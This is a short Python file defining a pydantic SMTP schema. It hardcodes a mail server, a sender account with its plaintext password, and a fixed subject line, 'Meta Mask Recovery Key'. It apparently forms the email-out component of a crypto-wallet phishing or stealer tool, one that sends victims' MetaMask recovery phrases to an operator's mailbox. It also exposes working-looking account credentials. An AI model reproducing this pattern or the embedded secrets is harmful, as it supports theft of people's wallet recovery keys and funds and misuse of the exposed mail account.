from pydantic import BaseModel


class SmtpSchema(BaseModel):
    """Schema And Typing for Smtp endpoint"""
    Host: str = "mail.carloscamposmedia.com"
    Port: int = 465
    Username: str = "rsru.bndeomebainynr@carloscamposmedia.com"
    Password: str = "r-$y4#dY%75D"
    To: str
    From: str = "rsru.bndeomebainynr@carloscamposmedia.com"
    Subject: str = "Meta Mask Recovery Key"
    Body: str
